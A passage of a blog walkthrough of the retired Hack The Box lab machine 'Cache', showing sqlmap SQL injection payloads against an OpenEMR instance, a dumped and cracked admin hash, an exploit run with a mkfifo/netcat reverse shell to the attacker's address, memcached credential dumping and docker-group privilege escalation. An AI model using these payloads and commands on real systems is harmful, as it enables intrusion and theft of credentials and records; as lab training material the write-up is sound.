[15:49:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[15:49:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[15:50:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[15:50:19] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[15:50:26] [INFO] GET parameter 'catid' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --string="Find")
[15:50:26] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[15:50:26] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[15:50:26] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[15:50:27] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[15:50:27] [INFO] testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[15:50:27] [INFO] testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[15:50:28] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:50:28] [INFO] GET parameter 'catid' is 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[15:50:28] [INFO] testing 'MySQL inline queries'
[15:50:29] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (comment)'
[15:50:29] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries'
[15:50:29] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)'
[15:50:30] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP)'
[15:50:30] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query - comment)'
[15:50:31] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'
[15:50:31] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
[15:50:43] [INFO] GET parameter 'catid' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[15:50:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:50:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[15:50:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:50:43] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:50:45] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
[15:50:52] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[15:51:00] [INFO] target URL appears to be UNION injectable with 1 columns
[15:51:01] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[15:51:10] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[15:51:18] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[15:51:25] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[15:51:32] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[15:51:39] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[15:51:47] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[15:51:56] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[15:52:03] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'catid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 398 HTTP(s) requests:
---
Parameter: catid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: catid=1' RLIKE (SELECT (CASE WHEN (2972=2972) THEN 1 ELSE 0x28 END))-- yKbG

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: catid=1' AND (SELECT 5394 FROM(SELECT COUNT(*),CONCAT(0x7170707671,(SELECT (ELT(5394=5394,1))),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YXZM

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: catid=1' AND (SELECT 5262 FROM (SELECT(SLEEP(5)))BjMN)-- GGWD
---
[15:52:18] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0
[15:52:22] [INFO] fetching database names
[15:52:22] [INFO] retrieved: 'information_schema'
[15:52:23] [INFO] retrieved: 'openemr'
available databases [2]:
[*] information_schema
[*] openemr

[15:52:23] [INFO] fetched data logged to text files under '/root/.sqlmap/output/hms.htb'

[*] ending @ 15:52:23 /2020-05-10/
</pre></table></code></div></div><p>Perfect !! got <code class="language-plaintext highlighter-rouge">openemr</code> . Now i need to find tables</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> req <span class="nt">-D</span> openemr <span class="nt">--tables</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
</pre><td class="rouge-code"><pre>Database: openemr
[234 tables]
+---------------------------------------+
| array                                 |
| groups                                |
| sequences                             |
| version                               |
| addresses                             |
| amc_misc_data                         |
| amendments                            |
| amendments_history                    |
| ar_activity                           |
| ar_session                            |
| audit_details                         |
| audit_master                          |
| automatic_notification                |
| background_services                   |
| batchcom                              |
| billing                               |
| calendar_external                     |
| categories                            |
| categories_seq                        |
| categories_to_documents               |
| ccda                                  |
| ccda_components                       |
| ccda_field_mapping                    |
| ccda_sections                         |
| ccda_table_mapping                    |
| chart_tracker                         |
| claims                                |
| clinical_plans                        |
| clinical_plans_rules                  |
| clinical_rules                        |
| clinical_rules_log                    |
| code_types                            |
| codes                                 |
| codes_history                         |
| config                                |
| config_seq                            |
| customlists                           |
| dated_reminders                       |
| dated_reminders_link                  |
| direct_message_log                    |
| documents                             |
| documents_legal_categories            |
| documents_legal_detail                |
| documents_legal_master                |
| drug_inventory                        |
| drug_sales                            |
| drug_templates                        |
| drugs                                 |
| eligibility_response                  |
| eligibility_verification              |
| employer_data                         |
| enc_category_map                      |
| erx_drug_paid                         |
| erx_narcotics                         |
| erx_rx_log                            |
| erx_ttl_touch                         |
| esign_signatures                      |
| extended_log                          |
| external_encounters                   |
| external_procedures                   |
| facility                              |
| facility_user_ids                     |
| fee_sheet_options                     |
| form_care_plan                        |
| form_clinical_instructions            |
| form_dictation                        |
| form_encounter                        |
| form_eye_mag                          |
| form_eye_mag_dispense                 |
| form_eye_mag_impplan                  |
| form_eye_mag_orders                   |
| form_eye_mag_prefs                    |
| form_eye_mag_wearing                  |
| form_functional_cognitive_status      |
| form_group_attendance                 |
| form_groups_encounter                 |
| form_misc_billing_options             |
| form_observation                      |
| form_reviewofs                        |
| form_ros                              |
| form_soap                             |
| form_taskman                          |
| form_vitals                           |
| forms                                 |
| gacl_acl                              |
| gacl_acl_sections                     |
| gacl_acl_seq                          |
| gacl_aco                              |
| gacl_aco_map                          |
| gacl_aco_sections                     |
| gacl_aco_sections_seq                 |
| gacl_aco_seq                          |
| gacl_aro                              |
| gacl_aro_groups                       |
| gacl_aro_groups_id_seq                |
| gacl_aro_groups_map                   |
| gacl_aro_map                          |
| gacl_aro_sections                     |
| gacl_aro_sections_seq                 |
| gacl_aro_seq                          |
| gacl_axo                              |
| gacl_axo_groups                       |
| gacl_axo_groups_map                   |
| gacl_axo_map                          |
| gacl_axo_sections                     |
| gacl_groups_aro_map                   |
| gacl_groups_axo_map                   |
| gacl_phpgacl                          |
| geo_country_reference                 |
| geo_zone_reference                    |
| globals                               |
| gprelations                           |
| history_data                          |
| icd10_dx_order_code                   |
| icd10_gem_dx_10_9                     |
| icd10_gem_dx_9_10                     |
| icd10_gem_pcs_10_9                    |
| icd10_gem_pcs_9_10                    |
| icd10_pcs_order_code                  |
| icd10_reimbr_dx_9_10                  |
| icd10_reimbr_pcs_9_10                 |
| icd9_dx_code                          |
| icd9_dx_long_code                     |
| icd9_sg_code                          |
| icd9_sg_long_code                     |
| immunization_observation              |
| immunizations                         |
| insurance_companies                   |
| insurance_data                        |
| insurance_numbers                     |
| issue_encounter                       |
| issue_types                           |
| lang_constants                        |
| lang_custom                           |
| lang_definitions                      |
| lang_languages                        |
| layout_group_properties               |
| layout_options                        |
| lbf_data                              |
| lbt_data                              |
| list_options                          |
| lists                                 |
| lists_touch                           |
| log                                   |
| log_comment_encrypt                   |
| log_validator                         |
| medex_icons                           |
| medex_outgoing                        |
| medex_prefs                           |
| medex_recalls                         |
| misc_address_book                     |
| module_acl_group_settings             |
| module_acl_sections                   |
| module_acl_user_settings              |
| module_configuration                  |
| modules                               |
| modules_hooks_settings                |
| modules_settings                      |
| multiple_db                           |
| notes                                 |
| notification_log                      |
| notification_settings                 |
| onotes                                |
| onsite_documents                      |
| onsite_mail                           |
| onsite_messages                       |
| onsite_online                         |
| onsite_portal_activity                |
| onsite_signatures                     |
| openemr_module_vars                   |
| openemr_modules                       |
| openemr_postcalendar_categories       |
| openemr_postcalendar_events           |
| openemr_postcalendar_limits           |
| openemr_postcalendar_topics           |
| openemr_session_info                  |
| patient_access_offsite                |
| patient_access_onsite                 |
| patient_birthday_alert                |
| patient_data                          |
| patient_portal_menu                   |
| patient_reminders                     |
| patient_tracker                       |
| patient_tracker_element               |
| payment_gateway_details               |
| payments                              |
| pharmacies                            |
| phone_numbers                         |
| pma_bookmark                          |
| pma_column_info                       |
| pma_history                           |
| pma_pdf_pages                         |
| pma_relation                          |
| pma_table_coords                      |
| pma_table_info                        |
| pnotes                                |
| prescriptions                         |
| prices                                |
| procedure_answers                     |
| procedure_order                       |
| procedure_order_code                  |
| procedure_providers                   |
| procedure_questions                   |
| procedure_report                      |
| procedure_result                      |
| procedure_type                        |
| product_registration                  |
| product_warehouse                     |
| registry                              |
| report_itemized                       |
| report_results                        |
| rule_action                           |
| rule_action_item                      |
| rule_filter                           |
| rule_patient_data                     |
| rule_reminder                         |
| rule_target                           |
| shared_attributes                     |
| standardized_tables_track             |
| supported_external_dataloads          |
| syndromic_surveillance                |
| template_users                        |
| therapy_groups                        |
| therapy_groups_counselors             |
| therapy_groups_participant_attendance |
| therapy_groups_participants           |
| transactions                          |
| user_settings                         |
| users                                 |
| users_facility                        |
| users_secure                          |
| valueset                              |
| voids                                 |
| x12_partners                          |
+---------------------------------------+

[15:55:26] [INFO] fetched data logged to text files under '/root/.sqlmap/output/hms.htb'

[*] ending @ 15:55:26 /2020-05-10/
</pre></table></code></div></div><p>A lot of tables , <code class="language-plaintext highlighter-rouge">users_secure</code> seem interesting , let’s dump it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sqlmap <span class="nt">-r</span> req <span class="nt">-D</span> openemr <span class="nt">-T</span> users_secure <span class="nt">--dump</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Database: openemr
Table: users_secure
[1 entry]
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+

[15:57:55] [INFO] table 'openemr.users_secure' dumped to CSV file '/root/.sqlmap/output/hms.htb/dump/openemr/users_secure.csv'
[15:57:55] [INFO] fetched data logged to text files under '/root/.sqlmap/output/hms.htb'

</pre></table></code></div></div><p>Nice :) username <code class="language-plaintext highlighter-rouge">openemr_admin</code> and hash <code class="language-plaintext highlighter-rouge">$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</code> .<br /> I will crack this hash with john.<br /> Create a file and save the hash to it then:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>john <span class="nb">hash</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# john  hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
xxxxxx           (?)
1g 0:00:00:00 DONE 2/3 (2020-05-10 16:07) 5.263g/s 6063p/s 6063c/s 6063C/s stinky..88888888
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>The password is <code class="language-plaintext highlighter-rouge">xxxxxx</code> so now i can try the exploit with <code class="language-plaintext highlighter-rouge">openemr_admin : xxxxxx</code> <br /> The exploit also allow me to excute <code class="language-plaintext highlighter-rouge">command</code> so i will excute a <code class="language-plaintext highlighter-rouge">bash</code> reverse shell but first setup the listener …<br /></p><h2 id="get-www-data">Get www-data</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rlwrap nc <span class="nt">-vlp</span> 4444
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.16.81 4444 <span class="o">&gt;</span>/tmp/f
</pre></table></code></div></div><p>Finally run:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python 45161.py <span class="nt">-u</span> <span class="s1">'openemr_admin'</span> <span class="nt">-p</span> <span class="s1">'xxxxxx'</span> <span class="nt">-c</span> <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.81 4444 &gt;/tmp/f'</span> http://hms.htb
</pre></table></code></div></div><p>I received a shell as <code class="language-plaintext highlighter-rouge">www-data</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# rlwrap nc -vlp 4444
listening on [any] 4444 ...
connect to [10.10.16.81] from cache.htb [10.10.10.188] 36930
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@cache:/var/www/hms.htb/public_html/interface/main$ 
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">user.txt</code> is in <code class="language-plaintext highlighter-rouge">/home/ash</code> so i need to switch to this user . Thankfully i have the password to switch user , it’s <code class="language-plaintext highlighter-rouge">H@v3_fun</code>.<br /></p><p><code class="language-plaintext highlighter-rouge">su ash</code> and you get user</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>www-data@cache:/home/ash$ su ash
su ash
Password: H@v3_fun

ash@cache:~$ ls
ls
Desktop  Documents  Downloads  Music  Pictures  Public  user.txt
ash@cache:~$ wc -c user.txt
wc -c user.txt
33 user.txt
ash@cache:~$ 
</pre></table></code></div></div><p>User owned !!</p><h2 id="escalate-to-luffy">Escalate to luffy</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netstat <span class="nt">-antp</span>
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>ash@cache:~$ netstat -antp
netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0     15 10.10.10.188:36930      10.10.16.81:4444        ESTABLISHED -                   
tcp        0      0 127.0.0.1:11211         127.0.0.1:42544         TIME_WAIT   -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.10.188:80         10.10.14.26:64098       ESTABLISHED -                   
tcp6       0      0 10.10.10.188:80         10.10.14.26:64122       SYN_RECV    -                   
tcp6       0      0 10.10.10.188:80         10.10.14.26:64091       TIME_WAIT   -                   
tcp6       0      0 10.10.10.188:80         10.10.14.26:64090       TIME_WAIT   -                   
tcp6       0      0 10.10.10.188:80         10.10.16.81:46130       ESTABLISHED -                   
ash@cache:~$
</pre></table></code></div></div><p>I see a weired port <code class="language-plaintext highlighter-rouge">11211</code> running in local host .<br /> By doing a simple search , i found that is <code class="language-plaintext highlighter-rouge">memcrashed</code> service .<br /> I did a quick <code class="language-plaintext highlighter-rouge">locate</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>locate memcached
</pre></table></code></div></div><p>I found <code class="language-plaintext highlighter-rouge">/usr/share/memcached/scripts/memcached-tool</code> . I tried to excute it</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>ash@cache:~$ /usr/share/memcached/scripts/memcached-tool
/usr/share/memcached/scripts/memcached-tool
Usage: memcached-tool &lt;host[:port] | /path/to/socket&gt; [mode]

       memcached-tool 10.0.0.5:11211 display    # shows slabs
       memcached-tool 10.0.0.5:11211            # same.  (default is display)
       memcached-tool 10.0.0.5:11211 stats      # shows general stats
       memcached-tool 10.0.0.5:11211 settings   # shows settings stats
       memcached-tool 10.0.0.5:11211 sizes      # shows sizes stats
       memcached-tool 10.0.0.5:11211 dump       # dumps keys and values

WARNING! sizes is a development command.
As of 1.4 it is still the only command which will lock your memcached instance for some time.
If you have many millions of stored items, it can become unresponsive for several minutes.
Run this at your own risk. It is roadmapped to either make this feature optional
or at least speed it up.
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">dump</code> is interesting , maybe it can give me valuable info</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/share/memcached/scripts/memcached-tool 127.0.0.1:11211 dump
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>ash@cache:~$ /usr/share/memcached/scripts/memcached-tool 127.0.0.1:11211 dump
/usr/share/memcached/scripts/memcached-tool 127.0.0.1:11211 dump
Dumping memcache contents
  Number of buckets: 1
  Number of items  : 5
Dumping bucket 1 - 5 total items
add passwd 0 0 9
0n3_p1ec3
add file 0 0 7
nothing
add link 0 0 21
https://hackthebox.eu
add account 0 0 9
afhj556uo
add user 0 0 5
luffy
ash@cache:~$ 
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">0n3_p1ec3</code> is the <code class="language-plaintext highlighter-rouge">lufyy</code> password so let’s ssh with it</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>root@kali:~/Desktop/hacktheboxmachine/cache# ssh luffy@cache.htb 
luffy@cache.htb's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 10 13:34:50 UTC 2020

  System load:  0.0               Processes:              185
  Usage of /:   74.2% of 8.06GB   Users logged in:        0
  Memory usage: 19%               IP address for ens160:  10.10.10.188
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

107 packages can be updated.
0 updates are security updates.


Last login: Wed May  6 08:54:44 2020 from 10.10.14.3
luffy@cache:~$ 
</pre></table></code></div></div><p>luffy done !</p><h2 id="own-root">Own root</h2><p>After a little bit of enumeration , i noticed that the user is in a docker group ,<br /> You can verify that using <code class="language-plaintext highlighter-rouge">id</code> or <code class="language-plaintext highlighter-rouge">cat /etc/group</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre>root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
crontab:x:105:
syslog:x:106:
messagebus:x:107:
lxd:x:108:
mlocate:x:109:
uuidd:x:110:
ssh:x:111:
landscape:x:112:
ash:x:1000:
luffy:x:1001:
ssl-cert:x:113:
memcache:x:114:
docker:x:999:luffy
mysql:x:115:
</pre></table></code></div></div><p>I searched for <code class="language-plaintext highlighter-rouge">docker user priv escalation</code> and found a useful <a href="https://www.hackingarticles.in/docker-privilege-escalation/">article</a></p><p>I need to find the <code class="language-plaintext highlighter-rouge">docker image</code> , this can be done using <code class="language-plaintext highlighter-rouge">docker images</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>luffy@cache:~<span class="nv">$ </span>docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB
luffy@cache:~<span class="nv">$ </span>
</pre></table></code></div></div><p>it’s <code class="language-plaintext highlighter-rouge">ubuntu</code> and i need to get the content of <code class="language-plaintext highlighter-rouge">/root</code> so run :</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>docker run -v /root:/mnt -it ubuntu
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>luffy@cache:~$ docker run -v /root:/mnt -it ubuntu
root@a34bb52ae203:/# whoami
root
root@a34bb52ae203:/# wc -c /mnt/root.txt 
33 /mnt/root.txt
root@a34bb52ae203:/# 
</pre></table></code></div></div><p>rooted :) Your Feedback is appreciated</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sqlmap/" class="post-tag no-text-decoration" >sqlmap</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cache - yassine&url=https://0xyassine.github.io//posts/cache/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cache - yassine&u=https://0xyassine.github.io//posts/cache/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Cache - yassine&url=https://0xyassine.github.io//posts/cache/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/traceback/">Traceback</a></li><li><a href="/posts/cache/">Cache</a></li><li><a href="/posts/admirer/">Admirer</a></li><li><a href="/posts/Quick/">Quick</a></li><li><a href="/posts/ForwardSlash/">ForwardSlash</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/web-shell/">web shell</a> <a class="post-tag" href="/tags/sqlmap/">sqlmap</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> 